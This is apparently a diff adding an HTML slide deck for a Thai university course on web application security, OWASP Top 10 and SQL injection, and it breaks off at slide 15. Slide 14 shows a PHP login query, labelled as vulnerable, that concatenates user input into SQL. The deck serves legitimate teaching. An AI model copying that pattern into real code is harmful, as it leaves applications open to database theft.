@@ -1,0 +1,2039 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Week 7: Web Application Security & OWASP Overview - ENGSE214</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --slide-bg: #ffffff;
+            --text-color: #2c3e50;
+            --font-size-base: 1rem;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-gradient);
+            color: var(--text-color);
+            overflow: hidden;
+            line-height: 1.6;
+        }
+
+        .presentation {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .slide-container {
+            position: relative;
+            width: 90vw;
+            max-width: 1400px;
+            height: 85vh;
+            background: var(--slide-bg);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .slide {
+            display: none;
+            width: 100%;
+            height: 100%;
+            padding: 60px 80px;
+            overflow-y: auto;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        .slide.active {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        /* Typography */
+        h1 {
+            font-size: calc(2.5rem * var(--font-size-base));
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        h2 {
+            font-size: calc(2rem * var(--font-size-base));
+            color: var(--secondary-color);
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        h3 {
+            font-size: calc(1.5rem * var(--font-size-base));
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        p, li {
+            font-size: calc(1.1rem * var(--font-size-base));
+            margin-bottom: 10px;
+            line-height: 1.8;
+        }
+
+        /* Title Slide */
+        .title-slide {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .title-slide h1 {
+            font-size: calc(3.5rem * var(--font-size-base));
+            color: white;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .title-slide .subtitle {
+            font-size: calc(1.8rem * var(--font-size-base));
+            margin-bottom: 20px;
+            opacity: 0.95;
+        }
+
+        .title-slide .meta {
+            font-size: calc(1.2rem * var(--font-size-base));
+            opacity: 0.9;
+            margin-top: 20px;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .info-box h3 {
+            color: white;
+            margin-bottom: 15px;
+        }
+
+        /* Warning Box */
+        .warning-box {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        /* Success Box */
+        .success-box {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        /* Code Block */
+        .code-block {
+            background: #2d3436;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: calc(1rem * var(--font-size-base));
+            overflow-x: auto;
+            margin: 20px 0;
+            white-space: pre;
+        }
+
+        /* Grid Layout */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin: 20px 0;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        /* Card */
+        .card {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        .card h3 {
+            color: var(--secondary-color);
+            margin-bottom: 10px;
+        }
+
+        /* List Styling */
+        ul, ol {
+            margin-left: 30px;
+            margin-bottom: 20px;
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+
+        .icon-list {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .icon-list li {
+            padding-left: 30px;
+            position: relative;
+        }
+
+        .icon-list li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: var(--success-color);
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        /* Badge */
+        .badge {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: calc(0.9rem * var(--font-size-base));
+            font-weight: 600;
+            margin: 5px;
+        }
+
+        .badge-danger {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .badge-warning {
+            background: #f39c12;
+            color: white;
+        }
+
+        .badge-success {
+            background: #27ae60;
+            color: white;
+        }
+
+        .badge-info {
+            background: #3498db;
+            color: white;
+        }
+
+        /* ASCII Art Box */
+        .ascii-box {
+            background: #f8f9fa;
+            border: 3px solid #3498db;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: calc(0.9rem * var(--font-size-base));
+            white-space: pre;
+            overflow-x: auto;
+            margin: 20px 0;
+            line-height: 1.4;
+        }
+
+        /* Navigation Controls */
+        .controls {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 15px;
+            z-index: 1000;
+        }
+
+        .control-btn {
+            background: rgba(255, 255, 255, 0.95);
+            color: var(--primary-color);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: calc(1rem * var(--font-size-base));
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .control-btn:hover {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .control-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Font Size Controls */
+        .font-controls {
+            position: fixed;
+            top: 30px;
+            right: 30px;
+            display: flex;
+            gap: 10px;
+            z-index: 1000;
+        }
+
+        .font-btn {
+            background: rgba(255, 255, 255, 0.95);
+            color: var(--primary-color);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .font-btn:hover {
+            background: white;
+            transform: translateY(-2px);
+        }
+
+        /* Slide Counter */
+        .slide-counter {
+            position: fixed;
+            top: 30px;
+            left: 30px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            color: var(--primary-color);
+        }
+
+        /* Fullscreen Button */
+        .fullscreen-btn {
+            position: fixed;
+            top: 30px;
+            right: 30px;
+            background: rgba(255, 255, 255, 0.95);
+            color: var(--primary-color);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            z-index: 999;
+            margin-top: 60px;
+        }
+
+        .fullscreen-btn:hover {
+            background: white;
+            transform: translateY(-2px);
+        }
+
+        /* Highlight Text */
+        .highlight {
+            background: linear-gradient(120deg, #f6d365 0%, #fda085 100%);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+
+        /* Emoji Icons */
+        .emoji {
+            font-size: 1.5em;
+            margin-right: 10px;
+        }
+
+        /* Table Styling */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        th {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        tr:hover {
+            background: #f5f5f5;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            transition: width 0.3s ease;
+            z-index: 1001;
+        }
+
+        /* Section Divider */
+        .section-divider {
+            height: 3px;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            margin: 30px 0;
+            border-radius: 2px;
+        }
+
+        /* Quote Box */
+        .quote-box {
+            border-left: 5px solid var(--secondary-color);
+            background: #f8f9fa;
+            padding: 20px 25px;
+            margin: 20px 0;
+            font-style: italic;
+            border-radius: 5px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .slide {
+                padding: 40px 50px;
+            }
+
+            h1 {
+                font-size: calc(2rem * var(--font-size-base));
+            }
+
+            .grid-2, .grid-3 {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Number Circle */
+        .number-circle {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 50%;
+            font-weight: bold;
+            margin-right: 15px;
+            font-size: 1.2em;
+        }
+
+        /* Status Indicator */
+        .status {
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            margin: 5px;
+        }
+
+        .status-critical {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .status-high {
+            background: #f39c12;
+            color: white;
+        }
+
+        .status-medium {
+            background: #f1c40f;
+            color: #2c3e50;
+        }
+
+        .status-low {
+            background: #27ae60;
+            color: white;
+        }
+
+        /* Flex Container */
+        .flex-center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        /* Animation */
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Attack Flow */
+        .attack-flow {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .flow-step {
+            flex: 1;
+            text-align: center;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .flow-arrow {
+            font-size: 2em;
+            color: var(--accent-color);
+            margin: 0 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Progress Bar -->
+    <div class="progress-bar" id="progressBar"></div>
+
+    <!-- Slide Counter -->
+    <div class="slide-counter" id="slideCounter">1 / 38</div>
+
+    <!-- Font Size Controls -->
+    <div class="font-controls">
+        <button class="font-btn" onclick="decreaseFontSize()">A-</button>
+        <button class="font-btn" onclick="resetFontSize()">A</button>
+        <button class="font-btn" onclick="increaseFontSize()">A+</button>
+    </div>
+
+    <!-- Fullscreen Button -->
+    <button class="fullscreen-btn" onclick="toggleFullscreen()">⛶ Fullscreen</button>
+
+    <div class="presentation">
+        <div class="slide-container">
+            
+            <!-- Slide 1: Title -->
+            <div class="slide active title-slide">
+                <h1>🔐 Week 7</h1>
+                <div class="subtitle">Web Application Security & OWASP Overview</div>
+                <div class="meta">
+                    <p>ENGSE214 – ความมั่นคงปลอดภัยทางไซเบอร์เบื้องต้น</p>
+                    <p>Software Engineering Program</p>
+                    <p>📅 ภาคเรียนที่ 2/2568</p>
+                </div>
+            </div>
+
+            <!-- Slide 2: Course Info -->
+            <div class="slide">
+                <h1>📋 ข้อมูลการเรียนการสอน</h1>
+                <div class="info-box">
+                    <h3>⏱️ เวลาการสอน</h3>
+                    <p>2-3 ชั่วโมง (รวม Demo และ Lab Activities)</p>
+                </div>
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>🎯 CLO ที่เกี่ยวข้อง</h3>
+                        <ul>
+                            <li><strong>CLO2:</strong> วิเคราะห์ภัยคุกคามและช่องโหว่</li>
+                            <li><strong>CLO3:</strong> ประยุกต์เทคนิคการป้องกัน</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>📊 การประเมินผล</h3>
+                        <ul>
+                            <li>Lab 3 Report: 10 คะแนน</li>
+                            <li>Quiz Week 7: 10 คะแนน</li>
+                            <li>Participation: 5 คะแนน</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 3: Week 6 Review -->
+            <div class="slide">
+                <h1>📚 ทบทวน Week 6: Cryptography Basics</h1>
+                <div class="ascii-box">┌─────────────────────────────────────────────────────────┐
+│  🔐 สิ่งที่เราเรียนรู้ใน Week 6                          │
+├─────────────────────────────────────────────────────────┤
+│                                                         │
+│  ✔ Symmetric Encryption (AES, DES)                     │
+│    → ใช้ Key เดียวกันทั้งเข้ารหัสและถอดรหัส              │
+│    → เร็ว แต่มีปัญหาการแจก Key                          │
+│                                                         │
+│  ✔ Asymmetric Encryption (RSA, ECC)                    │
+│    → ใช้ Public Key + Private Key                      │
+│    → แก้ปัญหาการแจก Key แต่ช้ากว่า                      │
+│                                                         │
+│  ✔ Hash Functions (SHA-256, SHA-3)                     │
+│    → One-way function สำหรับตรวจสอบ Integrity          │
+│    → ใช้ใน Password Storage, Digital Signature         │
+│                                                         │
+│  ✔ Digital Certificates & PKI                          │
+│    → สร้างความเชื่อถือบน Internet (HTTPS)               │
+│                                                         │
+└─────────────────────────────────────────────────────────┘</div>
+            </div>
+
+            <!-- Slide 4: Connection to Week 7 -->
+            <div class="slide">
+                <h1>🔗 จาก Week 6 สู่ Week 7</h1>
+                <div class="warning-box">
+                    <h2>🤔 คำถามสำคัญ</h2>
+                    <p style="font-size: 1.3em; margin-top: 20px;">
+                        "Cryptography ช่วยปกป้อง Data in Transit (HTTPS) แล้ว<br>
+                        ทำไมเว็บไซต์ยังถูก Hack ได้?"
+                    </p>
+                </div>
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>✅ สิ่งที่ Crypto ป้องกันได้</h3>
+                        <ul>
+                            <li>การดักจับข้อมูลระหว่างทาง</li>
+                            <li>การแก้ไขข้อมูลโดยไม่ได้รับอนุญาต</li>
+                            <li>การปลอมตัวเป็นเซิร์ฟเวอร์</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>❌ สิ่งที่ Crypto ป้องกันไม่ได้</h3>
+                        <ul>
+                            <li>SQL Injection ดึงข้อมูลทั้ง Database</li>
+                            <li>XSS ขโมย Session Cookie</li>
+                            <li>Broken Access Control</li>
+                            <li>Security Misconfiguration</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="quote-box">
+                    <strong>💡 Key Insight:</strong> Application Security ≠ Network Security
+                </div>
+            </div>
+
+            <!-- Slide 5: Learning Objectives -->
+            <div class="slide">
+                <h1>🎯 วัตถุประสงค์การเรียนรู้</h1>
+                <p style="font-size: 1.2em; margin-bottom: 30px;">เมื่อจบ Week 7 นักศึกษาจะสามารถ:</p>
+                <div class="grid-2">
+                    <div class="info-box">
+                        <div class="number-circle">1</div>
+                        <strong>อธิบาย OWASP Top 10</strong>
+                        <p>และความสำคัญในการพัฒนาซอฟต์แวร์ปลอดภัย</p>
+                    </div>
+                    <div class="info-box">
+                        <div class="number-circle">2</div>
+                        <strong>วิเคราะห์และสาธิต</strong>
+                        <p>การโจมตีแบบ SQL Injection</p>
+                    </div>
+                    <div class="info-box">
+                        <div class="number-circle">3</div>
+                        <strong>วิเคราะห์และสาธิต</strong>
+                        <p>การโจมตีแบบ Cross-Site Scripting (XSS)</p>
+                    </div>
+                    <div class="info-box">
+                        <div class="number-circle">4</div>
+                        <strong>ประยุกต์ใช้เทคนิค</strong>
+                        <p>Input Validation และ Parameterized Query</p>
+                    </div>
+                </div>
+                <div class="success-box" style="margin-top: 20px;">
+                    <div class="number-circle">5</div>
+                    <strong>นำหลักการ Secure Coding</strong> ไปใช้ในโค้ดของตนเอง
+                </div>
+            </div>
+
+            <!-- Slide 6: Thought-Provoking Question -->
+            <div class="slide">
+                <h1>💭 คำถามชวนคิด</h1>
+                <div class="ascii-box" style="font-size: 1.1em;">╔═══════════════════════════════════════════════════════╗
+║                                                       ║
+║   🤔 "เว็บไซต์ธนาคารมี HTTPS (🔒) แล้ว                ║
+║       ทำไมยังถูก Hack ได้?"                            ║
+║                                                       ║
+║   คำตอบ: HTTPS ป้องกันเฉพาะ "Data in Transit"         ║
+║          แต่ไม่ได้ป้องกัน...                            ║
+║                                                       ║
+║   ❌ SQL Injection ที่ดึงข้อมูลทั้ง Database           ║
+║   ❌ XSS ที่ขโมย Session Cookie                       ║
+║   ❌ Broken Access Control ที่เข้าถึงข้อมูลคนอื่น       ║
+║   ❌ Security Misconfiguration ที่เปิดช่องให้โจมตี       ║
+║                                                       ║
+║   👉 Application Security ≠ Network Security          ║
+║                                                       ║
+╚═══════════════════════════════════════════════════════╝</div>
+                <div class="warning-box" style="margin-top: 30px;">
+                    <h3>⚠️ ข้อคิดสำคัญ</h3>
+                    <p>การเข้ารหัสข้อมูล (Encryption) ไม่ได้ช่วยอะไรถ้าแอปพลิเคชันมีช่องโหว่ที่ให้ Attacker เข้าถึงข้อมูลได้โดยตรง!</p>
+                </div>
+            </div>
+
+            <!-- Slide 7: Introduction to OWASP -->
+            <div class="slide">
+                <h1>🦎 Part 1: ทำความรู้จัก OWASP</h1>
+                <div class="info-box">
+                    <h2>OWASP คืออะไร?</h2>
+                    <p><strong>Open Worldwide Application Security Project</strong></p>
+                    <p>องค์กรไม่แสวงหากำไรที่มุ่งเน้นการพัฒนาความปลอดภัยของซอฟต์แวร์</p>
+                </div>
+                <div class="ascii-box">┌─────────────────────────────────────────────────────┐
+│              🦎 OWASP Foundation                    │
+├─────────────────────────────────────────────────────┤
+│                                                     │
+│  📋 Projects ที่สำคัญ:                               │
+│                                                     │
+│  ┌───────────┐  ┌───────────┐  ┌───────────┐      │
+│  │ Top 10    │  │ OWASP ZAP │  │ Juice Shop│      │
+│  │ (รายการ   │  │ (Scanner) │  │ (Training)│      │
+│  │  ช่องโหว่) │  └───────────┘  └───────────┘      │
+│  └───────────┘                                      │
+│                                                     │
+│  🌍 Website: https://owasp.org                      │
+│  📖 ทุกอย่างเป็น Open Source และ Free!              │
+│                                                     │
+└─────────────────────────────────────────────────────┘</div>
+            </div>
+
+            <!-- Slide 8: OWASP Projects -->
+            <div class="slide">
+                <h1>🔧 OWASP Projects สำคัญ</h1>
+                <div class="grid-3">
+                    <div class="card">
+                        <h3>📊 OWASP Top 10</h3>
+                        <p>รายการช่องโหว่ที่สำคัญที่สุด อัปเดตทุก 3-4 ปี</p>
+                        <span class="badge badge-danger">Must Know</span>
+                    </div>
+                    <div class="card">
+                        <h3>🔍 OWASP ZAP</h3>
+                        <p>เครื่องมือสแกนช่องโหว่ในเว็บแอปพลิเคชัน</p>
+                        <span class="badge badge-info">Tool</span>
+                    </div>
+                    <div class="card">
+                        <h3>🧃 Juice Shop</h3>
+                        <p>เว็บแอปที่มีช่องโหว่สำหรับฝึกหัด</p>
+                        <span class="badge badge-success">Practice</span>
+                    </div>
+                    <div class="card">
+                        <h3>📏 ASVS</h3>
+                        <p>มาตรฐานการทดสอบความปลอดภัย</p>
+                        <span class="badge badge-info">Standard</span>
+                    </div>
+                    <div class="card">
+                        <h3>📚 Cheat Sheets</h3>
+                        <p>คู่มือ Secure Coding แยกตามหัวข้อ</p>
+                        <span class="badge badge-warning">Guide</span>
+                    </div>
+                    <div class="card">
+                        <h3>🔎 Dependency Check</h3>
+                        <p>ตรวจสอบ Library ที่มีช่องโหว่</p>
+                        <span class="badge badge-warning">Tool</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 9: Why OWASP Top 10 Matters -->
+            <div class="slide">
+                <h1>❓ ทำไม OWASP Top 10 ถึงสำคัญ?</h1>
+                <div class="grid-2">
+                    <div>
+                        <div class="ascii-box">     ┌────────────────────┐
+     │  📊 OWASP Top 10   │
+     │     ถูกใช้เป็น...    │
+     └─────────┬──────────┘
+               │
+       ┌───────┼───────┐
+       │       │       │
+       ▼       ▼       ▼
+  ┌────────┐ ┌────────┐ ┌────────┐
+  │มาตรฐาน │ │แนวทาง  │ │ข้อกำหนด│
+  │Compli- │ │Training│ │ในสัญญา │
+  │ ance   │ │สำหรับ  │ │จ้างพัฒนา│
+  │(PCI-DSS│ │  Dev   │ │        │
+  └────────┘ └────────┘ └────────┘</div>
+                    </div>
+                    <div>
+                        <h3>🏢 ใครใช้ OWASP Top 10?</h3>
+                        <ul class="icon-list">
+                            <li>บริษัทพัฒนาซอฟต์แวร์ทั่วโลก</li>
+                            <li>สถาบันการเงิน (ข้อกำหนด PCI-DSS)</li>
+                            <li>หน่วยงานราชการ</li>
+                            <li>สถาบันการศึกษา</li>
+                            <li>Security Auditors</li>
+                            <li>Penetration Testers</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="success-box" style="margin-top: 20px;">
+                    <h3>💡 สำหรับ Software Engineers</h3>
+                    <p>OWASP Top 10 เป็นมาตรฐานที่ควรรู้และนำไปใช้ในการพัฒนาซอฟต์แวร์ทุกโปรเจกต์!</p>
+                </div>
+            </div>
+
+            <!-- Slide 10: OWASP Top 10:2025 Overview -->
+            <div class="slide">
+                <h1>🏆 OWASP Top 10:2025 - ภาพรวม</h1>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>อันดับ</th>
+                            <th>ช่องโหว่</th>
+                            <th>ความรุนแรง</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>#1</strong></td>
+                            <td>🔓 Broken Access Control</td>
+                            <td><span class="status status-critical">Critical</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>#2</strong></td>
+                            <td>⚙️ Security Misconfiguration</td>
+                            <td><span class="status status-high">High</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>#3</strong></td>
+                            <td>📦 Software Supply Chain Failures</td>
+                            <td><span class="status status-high">High</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>#4</strong></td>
+                            <td>🔐 Cryptographic Failures</td>
+                            <td><span class="status status-high">High</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>#5</strong></td>
+                            <td>💉 Injection (SQL, XSS, Command)</td>
+                            <td><span class="status status-critical">Critical</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p style="text-align: center; margin-top: 20px; font-size: 1.1em;">
+                    <strong>หมายเหตุ:</strong> มีทั้งหมด 10 อันดับ - วันนี้เราจะเน้นที่ <span class="highlight">#5 Injection</span>
+                </p>
+            </div>
+
+            <!-- Slide 11: OWASP Top 10:2025 Complete List -->
+            <div class="slide">
+                <h1>📋 OWASP Top 10:2025 - รายการครบ</h1>
+                <div class="grid-2">
+                    <div>
+                        <div class="card">
+                            <h3>🔓 #1 Broken Access Control</h3>
+                            <p>เข้าถึงข้อมูล/ฟังก์ชันที่ไม่ได้รับอนุญาต</p>
+                        </div>
+                        <div class="card">
+                            <h3>⚙️ #2 Security Misconfiguration</h3>
+                            <p>การตั้งค่าความปลอดภัยผิดพลาด</p>
+                        </div>
+                        <div class="card">
+                            <h3>📦 #3 Supply Chain Failures</h3>
+                            <p>ช่องโหว่จาก Dependencies <span class="badge badge-warning">NEW!</span></p>
+                        </div>
+                        <div class="card">
+                            <h3>🔐 #4 Cryptographic Failures</h3>
+                            <p>การใช้งาน Cryptography ผิดวิธี</p>
+                        </div>
+                        <div class="card">
+                            <h3>💉 #5 Injection</h3>
+                            <p>แทรกโค้ดอันตรายผ่าน User Input</p>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="card">
+                            <h3>📐 #6 Insecure Design</h3>
+                            <p>ข้อบกพร่องในการออกแบบระบบ</p>
+                        </div>
+                        <div class="card">
+                            <h3>🔑 #7 Authentication Failures</h3>
+                            <p>ปัญหาระบบ Login และ Session</p>
+                        </div>
+                        <div class="card">
+                            <h3>🧩 #8 Vulnerable Components</h3>
+                            <p>ใช้ Library/Framework ที่มีช่องโหว่</p>
+                        </div>
+                        <div class="card">
+                            <h3>📊 #9 Logging Failures</h3>
+                            <p>การ Log และ Monitor ไม่เพียงพอ</p>
+                        </div>
+                        <div class="card">
+                            <h3>🔀 #10 SSRF</h3>
+                            <p>Server-Side Request Forgery</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 12: Focus on Injection -->
+            <div class="slide">
+                <h1>🎯 Focus: Injection Attacks</h1>
+                <div class="warning-box">
+                    <h2>💉 Injection คืออะไร?</h2>
+                    <p style="font-size: 1.2em;">การแทรก (Inject) โค้ดหรือคำสั่งที่เป็นอันตรายผ่านทาง <strong>User Input</strong> เพื่อควบคุมหรือเข้าถึงระบบโดยไม่ได้รับอนุญาต</p>
+                </div>
+                <div class="grid-3" style="margin-top: 30px;">
+                    <div class="card">
+                        <h3>💉 SQL Injection</h3>
+                        <p>แทรกคำสั่ง SQL เพื่อดึง/แก้ไขข้อมูลใน Database</p>
+                        <span class="badge badge-danger">สำคัญที่สุด</span>
+                    </div>
+                    <div class="card">
+                        <h3>🎭 Cross-Site Scripting (XSS)</h3>
+                        <p>แทรก JavaScript เพื่อโจมตีผู้ใช้อื่น</p>
+                        <span class="badge badge-danger">สำคัญมาก</span>
+                    </div>
+                    <div class="card">
+                        <h3>💻 Command Injection</h3>
+                        <p>แทรกคำสั่ง OS เพื่อควบคุม Server</p>
+                        <span class="badge badge-warning">อันตราย</span>
+                    </div>
+                </div>
+                <div class="info-box" style="margin-top: 30px;">
+                    <h3>📊 สถิติที่น่าสนใจ</h3>
+                    <ul>
+                        <li>Injection ถูกพบเป็นอันดับต้นๆ ต่อเนื่องมากว่า <strong>15 ปี</strong></li>
+                        <li>มากกว่า <strong>80% ของเว็บแอปพลิเคชัน</strong> มีช่องโหว่ Injection อย่างน้อย 1 จุด</li>
+                        <li>ค่าเสียหายเฉลี่ยจาก SQL Injection: <strong>$200,000 - $1,000,000</strong> ต่อครั้ง</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Slide 13: SQL Injection - Introduction -->
+            <div class="slide">
+                <h1>💉 Part 3: SQL Injection</h1>
+                <h2>3.1 SQL Injection คืออะไร?</h2>
+                <div class="warning-box">
+                    <p style="font-size: 1.2em;">การแทรกคำสั่ง SQL ผ่านทาง User Input เพื่อเข้าถึงหรือแก้ไขข้อมูลใน Database โดยไม่ได้รับอนุญาต</p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div>
+                        <h3>🎯 เป้าหมายของ Attacker</h3>
+                        <ul class="icon-list">
+                            <li>ดึงข้อมูลทั้งหมดจาก Database</li>
+                            <li>แก้ไขหรือลบข้อมูล</li>
+                            <li>Bypass Authentication</li>
+                            <li>ควบคุม Database Server</li>
+                            <li>อ่านไฟล์ระบบ</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3>⚠️ ผลกระทบ</h3>
+                        <ul>
+                            <li><span class="status status-critical">สูงมาก</span> การรั่วไหลของข้อมูลลูกค้า</li>
+                            <li><span class="status status-critical">สูงมาก</span> การสูญเสียข้อมูลสำคัญ</li>
+                            <li><span class="status status-high">สูง</span> ความเสียหายต่อชื่อเสียง</li>
+                            <li><span class="status status-high">สูง</span> ค่าปรับทางกฎหมาย</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 14: SQL Injection - How It Works -->
+            <div class="slide">
+                <h1>🔍 SQL Injection - กลไกการทำงาน</h1>
+                <div class="attack-flow">
+                    <div class="flow-step">
+                        <h3>1️⃣ Normal Query</h3>
+                        <p>ผู้ใช้กรอกข้อมูลปกติ</p>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <h3>2️⃣ Malicious Input</h3>
+                        <p>แทรก SQL Command</p>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <h3>3️⃣ Execute</h3>
+                        <p>Database รันคำสั่ง</p>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <h3>4️⃣ Data Leak</h3>
+                        <p>ข้อมูลรั่วไหล</p>
+                    </div>
+                </div>
+                
+                <h3 style="margin-top: 30px;">💻 ตัวอย่างโค้ดที่มีช่องโหว่</h3>
+                <div class="code-block">// ❌ Vulnerable Code (String Concatenation)
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users 
+          WHERE username = '$username' 
+          AND password = '$password'";
+
+$result = mysqli_query($conn, $query);</div>
+                <div class="warning-box" style="margin-top: 20px;">
+                    <p><strong>⚠️ ปัญหา:</strong> ข้อมูลจาก User ถูกนำมาต่อกับ SQL Query โดยตรง!</p>
+                </div>
+            </div>
+
+            <!-- Slide 15: SQL Injection - Example Attack -->
+            <div class="slide">
